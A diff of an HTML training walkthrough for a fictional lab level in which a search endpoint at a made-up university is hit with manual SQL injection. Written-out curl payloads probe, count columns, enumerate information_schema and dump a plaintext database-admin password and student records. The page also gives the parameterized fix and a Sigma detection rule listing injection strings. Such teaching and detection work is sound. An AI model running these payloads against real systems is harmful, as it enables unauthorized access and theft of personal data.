@@ -14,7 +14,7 @@
   <meta name="twitter:card" content="summary">
   <meta name="theme-color" content="#0d1117">
   <link rel="icon" type="image/svg+xml" href="/favicon.svg">
-  <link rel="stylesheet" href="/walkthroughs/walkthrough.css?v=2.7.0">
+  <link rel="stylesheet" href="/walkthroughs/walkthrough.css?v=2.11.0">
 </head>
 <body class="page-doc">
 
@@ -51,8 +51,8 @@
 <h2 id="setup">§1 — The setup<a class="anchor" href="#setup" aria-label="Link to this section">#</a></h2>
 <p>Day three at Meridian State University. The level1 finding — Carlos&#39;s transcript endpoint handing out any student&#39;s record to any logged-in user (an IDOR / CWE-639) — closed the same afternoon.<sup class="cite"><a id="cite-cwe-639-1" href="#ref-1" aria-label="Source 1">1</a></sup> Carlos shipped the one-line ownership check, deleted the BluePier-era demo account that had been leaking a service credential through its <code>advisor_notes</code> field, and self-reported to Cedarwood Mutual (the cyber-insurance carrier) before Priya finished drafting the language. Two findings in two days, both remediated inside the audit window. Carlos is the easiest client Driftwood has.</p>
 <p>While cleaning up the demo account, Carlos recovered the service credential it had been leaking — <code>portal-svc</code> / <code>meridian-portal-svc-2026</code> — and, on a hunch, checked the catalog webapp host. The same key was sitting in that host&#39;s <code>authorized_keys</code>. BluePier had wired one service account across multiple hosts back in 2021 and nobody ever pulled it apart. That credential reuse is the third finding of the engagement; note it for the writeup. It&#39;s also how you get a shell on the catalog host:</p>
-<pre><code>guest@d3cyph3r:~$ ssh level2@web
-level2@web&#39;s password: meridian-portal-svc-2026
+<pre data-kind="plain"><code class="hl">guest@d3cyph3r:~$ ssh level2@web
+level2@web's password: meridian-portal-svc-2026
 </code></pre>
 <p>The prompt now reads <code>portal-svc@web:~$</code> — the lore host is <code>catalog.meridian.edu</code>. Today&#39;s target is the one piece of BluePier&#39;s 2021 work Carlos never rewrote: the public course-catalog search. It&#39;s the box prospective students use to browse Meridian&#39;s course list — no login required, and that part is correct. Course catalogs are public information. What&#39;s not correct is what BluePier did with the search term once it reached the server.</p>
 <p>Priya, with Meridian&#39;s general counsel cc&#39;d again, wants to know exactly how far that search box reaches. Her rules of engagement (in <code>priya-note.md</code>) are the same FERPA discipline as day two, with one sharpened edge:</p>
@@ -65,25 +65,25 @@ level2@web&#39;s password: meridian-portal-svc-2026
 <p>The discipline this level teaches is patience with a methodology. SQL injection is not one trick; it&#39;s a sequence — probe, confirm, count columns, fingerprint, enumerate, extract — and each step earns the next. A tool like <code>sqlmap</code> automates the entire sequence in one command. Doing it by hand once is how you understand what the tool is doing, and why a single bound parameter on the server side would have made the whole thing a 404.</p>
 <p>Every command quotes the whole URL so the shell doesn&#39;t split the spaces and quotes in the payload.</p>
 <h3 id="step-1-use-the-breadcrumb-to-enter-the-box">Step 1: Use the breadcrumb to enter the box<a class="anchor" href="#step-1-use-the-breadcrumb-to-enter-the-box" aria-label="Link to this section">#</a></h3>
-<pre><code class="language-bash">guest@d3cyph3r:~$ ssh level2@web
-level2@web&#39;s password: meridian-portal-svc-2026
+<pre data-kind="transcript"><code class="hl language-bash"><span class="tok-prompt">guest@d3cyph3r:~$</span> <span class="tok-cmd">ssh</span> level2@web
+<span class="tok-prompt">level2@web's password:</span> <span class="tok-str">meridian-portal-svc-2026</span>
 </code></pre>
 <p>The password is the <code>portal-svc</code> credential BluePier stashed in the M-0000001 demo account, recovered when Carlos decommissioned it after yesterday&#39;s IDOR finding. The same key turned out to be in the catalog host&#39;s <code>authorized_keys</code> — credential reuse across hosts, a finding in its own right. The connection banner identifies the host (<code>catalog.meridian.edu</code>) and the tier (Routine, ~22 min). Read <code>welcome.md</code> first — it explains what SQL injection is and lays out the order of operations.</p>
 <h3 id="step-2-read-the-brief-and-the-vulnerable-source">Step 2: Read the brief and the vulnerable source<a class="anchor" href="#step-2-read-the-brief-and-the-vulnerable-source" aria-label="Link to this section">#</a></h3>
-<pre><code class="language-bash">portal-svc@web:~$ cat priya-note.md
-portal-svc@web:~$ cat catalog-search.js
-portal-svc@web:~$ cat deploy-notes.md
+<pre data-kind="transcript"><code class="hl language-bash"><span class="tok-prompt">portal-svc@web:~$</span> <span class="tok-cmd">cat</span> priya-note.md
+<span class="tok-prompt">portal-svc@web:~$</span> <span class="tok-cmd">cat</span> catalog-search.js
+<span class="tok-prompt">portal-svc@web:~$</span> <span class="tok-cmd">cat</span> deploy-notes.md
 </code></pre>
 <p><code>priya-note.md</code> carries the rules of engagement above. <code>catalog-search.js</code> is the handler BluePier shipped — fifteen lines, and the vulnerability is one of them:</p>
-<pre><code class="language-javascript">router.get(&quot;/api/search&quot;, async (req, res) =&gt; {
-  const q = req.query.q || &quot;&quot;;
+<pre data-kind="source"><code class="hl language-javascript">router.get(<span class="tok-str">&quot;/api/search&quot;</span>, <span class="tok-key">async</span> (req, res) =&gt; {
+  <span class="tok-key">const</span> q = req.query.q || <span class="tok-str">&quot;&quot;</span>;
 
-  // BluePier built the query by gluing the search term straight into
-  // the SQL string. The term is NOT escaped or bound as a parameter.
-  //   &gt;&gt;&gt;  this is the vulnerability  &lt;&lt;&lt;
-  const sql =
-    &quot;SELECT sku, title, dept, credits FROM courses &quot; +
-    &quot;WHERE title LIKE &#39;%&quot; + q + &quot;%&#39;&quot;;
+  <span class="tok-com">// BluePier built the query by gluing the search term straight into</span>
+  <span class="tok-com">// the SQL string. The term is NOT escaped or bound as a parameter.</span>
+  <span class="tok-com">//   &gt;&gt;&gt;  this is the vulnerability  &lt;&lt;&lt;</span>
+  <span class="tok-key">const</span> sql =
+    <span class="tok-str">&quot;SELECT sku, title, dept, credits FROM courses &quot;</span> +
+    <span class="tok-str">&quot;WHERE title LIKE '%&quot;</span> + q + <span class="tok-str">&quot;%'&quot;</span>;
   ...
 </code></pre>
 <p>The <code>&quot;...&quot; + q + &quot;...&quot;</code> concatenation is the entire bug. The search term <code>q</code> is glued into the middle of a string literal in the SQL. Whatever characters <code>q</code> contains become part of the query. The <code>catch</code> block at the bottom of the handler returns the raw database error and the constructed <code>sql</code> string to the client — a second finding (CWE-209) you&#39;ll see fire in a moment.<sup class="cite"><a id="cite-cwe-209-1" href="#ref-2" aria-label="Source 2">2</a></sup></p>
@@ -94,7 +94,7 @@ portal-svc@web:~$ cat deploy-notes.md
 <li>The database is <strong>MySQL 5.7.38</strong>, which reached <a href="https://endoflife.date/mysql" target="_blank" rel="noopener noreferrer">end-of-life on October 31, 2023</a> — no security patches since.</li>
 </ul>
 <h3 id="step-3-watch-the-endpoint-behave-normally">Step 3: Watch the endpoint behave normally<a class="anchor" href="#step-3-watch-the-endpoint-behave-normally" aria-label="Link to this section">#</a></h3>
-<pre><code class="language-bash">portal-svc@web:~$ curl &quot;https://catalog.meridian.edu/api/search?q=biology&quot;
+<pre data-kind="transcript"><code class="hl language-bash"><span class="tok-prompt">portal-svc@web:~$</span> <span class="tok-cmd">curl</span> <span class="tok-str">&quot;https://catalog.meridian.edu/api/search?q=biology&quot;</span>
 {
   &quot;results&quot;: [
     { &quot;sku&quot;: &quot;BIO-101&quot;, &quot;title&quot;: &quot;Introduction to Biology&quot;, &quot;dept&quot;: &quot;Biology&quot;, &quot;credits&quot;: 4 },
@@ -105,35 +105,35 @@ portal-svc@web:~$ cat deploy-notes.md
 </code></pre>
 <p>A normal search returns matching courses as JSON. The app renders every row under the column names <code>sku</code>, <code>title</code>, <code>dept</code>, <code>credits</code>. Remember those four columns — UNION-based extraction has to match them.</p>
 <h3 id="step-4-probe-with-a-single-quote-cwe-209-bonus">Step 4: Probe with a single quote (CWE-209 bonus)<a class="anchor" href="#step-4-probe-with-a-single-quote-cwe-209-bonus" aria-label="Link to this section">#</a></h3>
-<pre><code class="language-bash">portal-svc@web:~$ curl &quot;https://catalog.meridian.edu/api/search?q=&#39;&quot;
+<pre data-kind="transcript"><code class="hl language-bash"><span class="tok-prompt">portal-svc@web:~$</span> <span class="tok-cmd">curl</span> <span class="tok-str">&quot;https://catalog.meridian.edu/api/search?q='&quot;</span>
 {
   &quot;status&quot;: &quot;error&quot;,
   &quot;message&quot;: &quot;Database query failed&quot;,
-  &quot;error&quot;: &quot;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;%&#39;&#39; at line 1&quot;,
-  &quot;query&quot;: &quot;SELECT sku, title, dept, credits FROM courses WHERE title LIKE &#39;%&#39;%&#39;&quot;
+  &quot;error&quot;: &quot;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1&quot;,
+  &quot;query&quot;: &quot;SELECT sku, title, dept, credits FROM courses WHERE title LIKE '%'%'&quot;
 }
 
   ✦ Bonus find unlocked: Verbose database errors in production
 </code></pre>
 <p>This single response is two findings. <strong>First:</strong> the endpoint is injectable — a lone <code>&#39;</code> produced a syntax error, which means your input is reaching the SQL parser as code, not data. <strong>Second:</strong> the application leaked the raw database error <em>and the exact query it built</em> straight to the HTTP response. That&#39;s CWE-209 (Generation of Error Message Containing Sensitive Information), and it turns blind trial-and-error into a guided exercise: you now know the backend is MySQL, you can see the query template, and you can read your own injection back to develop the payload. The bonus banner fires on this response.</p>
 <h3 id="step-5-confirm-with-a-tautology">Step 5: Confirm with a tautology<a class="anchor" href="#step-5-confirm-with-a-tautology" aria-label="Link to this section">#</a></h3>
-<pre><code class="language-bash">portal-svc@web:~$ curl &quot;https://catalog.meridian.edu/api/search?q=&#39; OR 1=1-- -&quot;
+<pre data-kind="transcript"><code class="hl language-bash"><span class="tok-prompt">portal-svc@web:~$</span> <span class="tok-cmd">curl</span> <span class="tok-str">&quot;https://catalog.meridian.edu/api/search?q=' OR 1=1-- -&quot;</span>
 { &quot;results&quot;: [ ...every course in the catalog... ], &quot;count&quot;: 8 }
 </code></pre>
 <p>The payload closes the string literal (<code>&#39;</code>), adds a condition that&#39;s always true (<code>OR 1=1</code>), and comments out the rest of BluePier&#39;s query (<code>-- -</code>). The constructed query becomes <code>... WHERE title LIKE &#39;%&#39; OR 1=1</code> and every course returns. Injection confirmed.</p>
 <p>A note on <code>-- -</code>: in MySQL, <code>--</code> only starts a comment when it&#39;s followed by whitespace or end-of-line. The trailing <code>-</code> after the space is the conventional way to make that required space visible and intentional — <code>-- </code> (with a trailing space) works too, but the dash makes it obvious you meant it. <code>#</code> also works as a MySQL comment.</p>
 <h3 id="step-6-count-the-columns">Step 6: Count the columns<a class="anchor" href="#step-6-count-the-columns" aria-label="Link to this section">#</a></h3>
 <p>A UNION can only join two SELECTs that return the <em>same number of columns</em>. You don&#39;t know the count yet from the outside (the source confirmed four, but you&#39;d determine it blind in a real engagement). Two techniques:</p>
-<pre><code class="language-bash">portal-svc@web:~$ curl &quot;https://catalog.meridian.edu/api/search?q=zzz&#39; ORDER BY 4-- -&quot;
+<pre data-kind="transcript"><code class="hl language-bash"><span class="tok-prompt">portal-svc@web:~$</span> <span class="tok-cmd">curl</span> <span class="tok-str">&quot;https://catalog.meridian.edu/api/search?q=zzz' ORDER BY 4-- -&quot;</span>
 { &quot;results&quot;: [], &quot;count&quot;: 0 }
 
-portal-svc@web:~$ curl &quot;https://catalog.meridian.edu/api/search?q=zzz&#39; ORDER BY 5-- -&quot;
+<span class="tok-prompt">portal-svc@web:~$</span> <span class="tok-cmd">curl</span> <span class="tok-str">&quot;https://catalog.meridian.edu/api/search?q=zzz' ORDER BY 5-- -&quot;</span>
 { &quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Database query failed&quot;,
-  &quot;error&quot;: &quot;Unknown column &#39;5&#39; in &#39;order clause&#39;&quot;, ... }
+  &quot;error&quot;: &quot;Unknown column '5' in 'order clause'&quot;, ... }
 </code></pre>
 <p><code>ORDER BY 4</code> is accepted; <code>ORDER BY 5</code> errors with <em>&quot;Unknown column &#39;5&#39; in &#39;order clause&#39;&quot;</em>. The query has four columns. (<code>zzz</code> is a search term that matches no course, so the only rows you see are the ones you inject — cleaner output.) You can confirm the same count with <code>UNION SELECT NULL,NULL,NULL,NULL-- -</code> (accepted) versus three NULLs (errors with <em>&quot;The used SELECT statements have a different number of columns&quot;</em>).</p>
 <h3 id="step-7-fingerprint-the-database">Step 7: Fingerprint the database<a class="anchor" href="#step-7-fingerprint-the-database" aria-label="Link to this section">#</a></h3>
-<pre><code class="language-bash">portal-svc@web:~$ curl &quot;https://catalog.meridian.edu/api/search?q=zzz&#39; UNION SELECT @@version,user(),database(),NULL-- -&quot;
+<pre data-kind="transcript"><code class="hl language-bash"><span class="tok-prompt">portal-svc@web:~$</span> <span class="tok-cmd">curl</span> <span class="tok-str">&quot;https://catalog.meridian.edu/api/search?q=zzz' UNION SELECT @@version,user(),database(),NULL-- -&quot;</span>
 {
   &quot;results&quot;: [
     { &quot;sku&quot;: &quot;5.7.38-0ubuntu0.18.04.1&quot;, &quot;title&quot;: &quot;meridian_app@localhost&quot;, &quot;dept&quot;: &quot;meridian_portal&quot;, &quot;credits&quot;: null }
@@ -144,7 +144,7 @@ portal-svc@web:~$ curl &quot;https://catalog.meridian.edu/api/search?q=zzz&#39; 
 <p>The injected row surfaces in the app&#39;s normal output slots: <code>@@version</code> lands in <code>sku</code>, <code>user()</code> in <code>title</code>, <code>database()</code> in <code>dept</code>. You now have the exact server version (MySQL 5.7.38 — the EOL build the deploy notes mentioned), the database user the app connects as (<code>meridian_app</code>), and the current schema (<code>meridian_portal</code>). This is the moment &quot;injected data surfaces where the page expected course data&quot; clicks.</p>
 <h3 id="step-8-enumerate-the-schema-via-information-schema">Step 8: Enumerate the schema via information_schema<a class="anchor" href="#step-8-enumerate-the-schema-via-information-schema" aria-label="Link to this section">#</a></h3>
 <p><code>information_schema</code> is SQL&#39;s own catalog — a set of virtual tables describing every other table. It&#39;s how you map a database you can&#39;t see:</p>
-<pre><code class="language-bash">portal-svc@web:~$ curl &quot;https://catalog.meridian.edu/api/search?q=zzz&#39; UNION SELECT table_name,NULL,NULL,NULL FROM information_schema.tables-- -&quot;
+<pre data-kind="transcript"><code class="hl language-bash"><span class="tok-prompt">portal-svc@web:~$</span> <span class="tok-cmd">curl</span> <span class="tok-str">&quot;https://catalog.meridian.edu/api/search?q=zzz' UNION SELECT table_name,NULL,NULL,NULL FROM information_schema.tables-- -&quot;</span>
 {
   &quot;results&quot;: [
     { &quot;sku&quot;: &quot;courses&quot;, ... },
@@ -156,12 +156,12 @@ portal-svc@web:~$ curl &quot;https://catalog.meridian.edu/api/search?q=zzz&#39; 
 }
 </code></pre>
 <p>Four tables. <code>courses</code> is the one the search was meant to read. <code>students</code> is FERPA-protected records. <code>staff_users</code> is the auth table. <code>app_config</code> looks like configuration — and configuration is where credentials hide. List its columns:</p>
-<pre><code class="language-bash">portal-svc@web:~$ curl &quot;https://catalog.meridian.edu/api/search?q=zzz&#39; UNION SELECT column_name,NULL,NULL,NULL FROM information_schema.columns WHERE table_name=&#39;app_config&#39;-- -&quot;
+<pre data-kind="transcript"><code class="hl language-bash"><span class="tok-prompt">portal-svc@web:~$</span> <span class="tok-cmd">curl</span> <span class="tok-str">&quot;https://catalog.meridian.edu/api/search?q=zzz' UNION SELECT column_name,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='app_config'-- -&quot;</span>
 { &quot;results&quot;: [ { &quot;sku&quot;: &quot;config_key&quot;, ... }, { &quot;sku&quot;: &quot;config_value&quot;, ... } ], &quot;count&quot;: 2 }
 </code></pre>
 <p>A simple key/value table.</p>
 <h3 id="step-9-dump-app-config-the-credential-the-level3-breadcrumb">Step 9: Dump app_config — the credential (the level3 breadcrumb)<a class="anchor" href="#step-9-dump-app-config-the-credential-the-level3-breadcrumb" aria-label="Link to this section">#</a></h3>
-<pre><code class="language-bash">portal-svc@web:~$ curl &quot;https://catalog.meridian.edu/api/search?q=zzz&#39; UNION SELECT config_key,config_value,NULL,NULL FROM app_config-- -&quot;
+<pre data-kind="transcript"><code class="hl language-bash"><span class="tok-prompt">portal-svc@web:~$</span> <span class="tok-cmd">curl</span> <span class="tok-str">&quot;https://catalog.meridian.edu/api/search?q=zzz' UNION SELECT config_key,config_value,NULL,NULL FROM app_config-- -&quot;</span>
 {
   &quot;results&quot;: [
     { &quot;sku&quot;: &quot;app.name&quot;,          &quot;title&quot;: &quot;Meridian Course Catalog&quot;,         ... },
@@ -179,7 +179,7 @@ portal-svc@web:~$ curl &quot;https://catalog.meridian.edu/api/search?q=zzz&#39; 
 <p>There it is. <code>db.admin.password</code> = <strong><code>M3rid14n-DBr00t!2026</code></strong>, the password for <code>meridian_dbadmin</code> — the database&#39;s administrative account, stored in plaintext in a database table. This is the prize Priya asked you to lead with: you reached the database&#39;s own superuser credential through a public, unauthenticated search box, without touching a single student record. With that credential an attacker owns the entire <code>meridian_portal</code> database — every transcript, every grade, every record. It&#39;s also the breadcrumb to <code>level3@web</code>.</p>
 <h3 id="step-10-demonstrate-the-ferpa-blast-radius-then-stop">Step 10: Demonstrate the FERPA blast radius (then stop)<a class="anchor" href="#step-10-demonstrate-the-ferpa-blast-radius-then-stop" aria-label="Link to this section">#</a></h3>
 <p>To prove reach — a handful of rows, per the rules of engagement — the same injection pulls student records:</p>
-<pre><code class="language-bash">portal-svc@web:~$ curl &quot;https://catalog.meridian.edu/api/search?q=zzz&#39; UNION SELECT student_id,full_name,email,gpa FROM students-- -&quot;
+<pre data-kind="transcript"><code class="hl language-bash"><span class="tok-prompt">portal-svc@web:~$</span> <span class="tok-cmd">curl</span> <span class="tok-str">&quot;https://catalog.meridian.edu/api/search?q=zzz' UNION SELECT student_id,full_name,email,gpa FROM students-- -&quot;</span>
 {
   &quot;results&quot;: [
     { &quot;sku&quot;: &quot;M-1872941&quot;, &quot;title&quot;: &quot;Aisha Patel&quot;,  &quot;dept&quot;: &quot;patel.a@meridian.edu&quot;, &quot;credits&quot;: 3.91 },
@@ -190,14 +190,14 @@ portal-svc@web:~$ curl &quot;https://catalog.meridian.edu/api/search?q=zzz&#39; 
 </code></pre>
 <p>Those are the same students from level0&#39;s exposed CSV — names, IDs, emails, GPAs, reachable from the open internet through a course search. Pull a handful, document it, and stop. (For contrast, dumping <code>staff_users</code> shows the staff passwords are bcrypt-hashed — <code>$2b$12$...</code> — so at least the auth table did it right. The plaintext DB-admin credential in <code>app_config</code> is the worse finding, and the point: even a well-hashed auth table doesn&#39;t matter when the database&#39;s master key is sitting in a config row.)</p>
 <h3 id="step-11-return-to-the-lobby-with-the-finding">Step 11: Return to the lobby with the finding<a class="anchor" href="#step-11-return-to-the-lobby-with-the-finding" aria-label="Link to this section">#</a></h3>
-<pre><code class="language-bash">portal-svc@web:~$ exit
+<pre data-kind="transcript"><code class="hl language-bash"><span class="tok-prompt">portal-svc@web:~$</span> <span class="tok-cmd">exit</span>
 </code></pre>
 <p>The deliverable is short and damning: a public, unauthenticated endpoint sharing a database with the student-records system; injection confirmed; the application&#39;s own database-admin credential extracted in plaintext; every FERPA-protected record reachable. The fix is one line (parameterize the query) plus four follow-ons (scope the DB account, stop leaking errors, rotate the credential, put the subdomain behind the WAF). Cedarwood Mutual needs it today.</p>
 <h2 id="vulnerability">§3 — The vulnerability<a class="anchor" href="#vulnerability" aria-label="Link to this section">#</a></h2>
 <p>The lesson in one sentence: <strong>when an application builds a query by gluing untrusted input into the query string, the input stops being data and becomes code.</strong></p>
 <p>The safe pattern keeps input and code separate by passing the input as a bound parameter:</p>
-<pre><code class="language-javascript">const sql = &quot;SELECT sku, title, dept, credits FROM courses WHERE title LIKE ?&quot;;
-const rows = await db.query(sql, [&#39;%&#39; + q + &#39;%&#39;]);
+<pre data-kind="source"><code class="hl language-javascript"><span class="tok-key">const</span> sql = <span class="tok-str">&quot;SELECT sku, title, dept, credits FROM courses WHERE title LIKE ?&quot;</span>;
+<span class="tok-key">const</span> rows = <span class="tok-key">await</span> db.query(sql, [<span class="tok-str">'%'</span> + q + <span class="tok-str">'%'</span>]);
 </code></pre>
 <p>The <code>?</code> is a placeholder. The database driver sends the query template and the parameter values over the wire <em>separately</em>; the value is never parsed as SQL. A single quote in the parameter stays a single quote — it can never close a string literal or introduce a keyword, because by the time it reaches the database, the query&#39;s structure is already fixed. This is &quot;parameterized queries&quot; / &quot;prepared statements,&quot; and it is the complete fix. Not input sanitization, not escaping, not a denylist of bad words — parameterization, which makes the class of bug structurally impossible.</p>
 <p>BluePier&#39;s handler did the opposite — string concatenation — and three failures stacked on top of it:</p>
@@ -301,36 +301,36 @@ records. The proof and the harm are separated by where you choose to stop.</p>
 <p>Union-based extraction leaves distinctive strings in the query string, and
 because the endpoint is public and unauthenticated there is no session to
 correlate against. The request itself is all the evidence there is.</p>
-<pre><code class="language-yaml">title: SQL injection patterns in a search query parameter
-status: stable
-description: &gt;
+<pre data-kind="source"><code class="hl language-yaml">title<span class="tok-op">:</span> SQL injection patterns in a search query parameter
+status<span class="tok-op">:</span> stable
+description<span class="tok-op">:</span> &gt;
   Detects union-based and schema-enumeration payloads in HTTP query
-  parameters. The information_schema references are the strongest signal:
-  a legitimate course search has no reason to name database metadata.
-logsource:
-  category: webserver
-detection:
-  union_extraction:
-    cs-uri-query|contains:
-      - &#39;union select&#39;
-      - &#39;union all select&#39;
-      - &#39;information_schema&#39;
-      - &#39;order by 1--&#39;
-  error_probing:
-    cs-uri-query|contains:
-      - &quot;&#39; or &#39;1&#39;=&#39;1&quot;
-      - &quot;&#39; and 1=2--&quot;
-      - &#39;sleep(&#39;
-      - &#39;benchmark(&#39;
-  condition: union_extraction or error_probing
-falsepositives:
-  - Course titles that genuinely contain these words. &quot;Database Design&quot;
-    will not match, but a catalogue containing a course on SQL might
-    produce a hit on a bare keyword, which is why the patterns above are
+  parameters. The information_schema references are the strongest signal<span class="tok-op">:</span>
+  a legitimate course search has <span class="tok-key">no</span> reason to name database metadata.
+logsource<span class="tok-op">:</span>
+  category<span class="tok-op">:</span> webserver
+detection<span class="tok-op">:</span>
+  union_extraction<span class="tok-op">:</span>
+    cs-uri-query|contains<span class="tok-op">:</span>
+      - <span class="tok-str">'union select'</span>
+      - <span class="tok-str">'union all select'</span>
+      - <span class="tok-str">'information_schema'</span>
+      - <span class="tok-str">'order by 1--'</span>
+  error_probing<span class="tok-op">:</span>
+    cs-uri-query|contains<span class="tok-op">:</span>
+      - <span class="tok-str">&quot;' or '1'='1&quot;</span>
+      - <span class="tok-str">&quot;' and 1=2--&quot;</span>
+      - <span class="tok-str">'sleep('</span>
+      - <span class="tok-str">'benchmark('</span>
+  condition<span class="tok-op">:</span> union_extraction or error_probing
+falsepositives<span class="tok-op">:</span>
+  - Course titles that genuinely contain these words. <span class="tok-str">&quot;Database Design&quot;</span>
+    will not match, but a catalogue containing a course <span class="tok-key">on</span> SQL might
+    produce a hit <span class="tok-key">on</span> a bare keyword, which is why the patterns above are
     multi-word rather than single tokens.
   - Authorised scanning. sqlmap is deliberately noisy and will generate
     many matches; correlate to the engagement schedule.
-level: high
+level<span class="tok-op">:</span> high
 </code></pre>
 <p>Verbose database errors are worth their own rule, and it is the cheaper
 of the two. Alert on any response body containing a MySQL error code such
